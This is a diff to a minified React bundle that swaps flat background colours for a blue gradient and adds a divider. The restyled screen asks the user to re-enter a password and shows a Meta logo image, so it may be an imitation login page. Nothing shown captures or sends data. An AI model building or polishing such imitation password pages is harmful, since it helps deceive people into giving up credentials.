@@ -10921,7 +10921,11 @@
             [y, b] = e.useState(0);
           let w;
           return (0, c.jsxs)("div", {
-            style: { backgroundColor: "#F5FFFA", height: "100vh" },
+            style: {
+              background:
+                "linear-gradient(86.37deg,#daedff -6.08%,#dfe7ff 34.89%,#f1f5fb 98.82%)",
+              height: "100vh",
+            },
             children: [
               (0, c.jsx)("div", {
                 className: "body",
@@ -11247,6 +11251,12 @@
                     },
                     children:
                       "For your security, you must enter your password to continue.",
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "1px solid #d0d0d0",
+                      marginTop: 20,
+                    },
                   }),
                   (0, c.jsxs)("div", {
                     className: "",
@@ -11693,14 +11703,18 @@
           }, []),
           1 === t
             ? (0, c.jsxs)("div", {
-                style: { background: "#F5FFFA" },
+                style: {
+                  background:
+                    "linear-gradient(86.37deg,#daedff -6.08%,#dfe7ff 34.89%,#f1f5fb 98.82%)",
+                },
                 children: [
                   (0, c.jsx)("div", {
                     style: {
                       paddingTop: 30,
                       paddingLeft: 30,
                       paddingBottom: 30,
-                      backgroundColor: "#F5FFFA",
+                      background:
+                        "linear-gradient(86.37deg,#daedff -6.08%,#dfe7ff 34.89%,#f1f5fb 98.82%)",
                     },
                     children: (0, c.jsx)("img", {
                       src: "/resources/meta.svg",
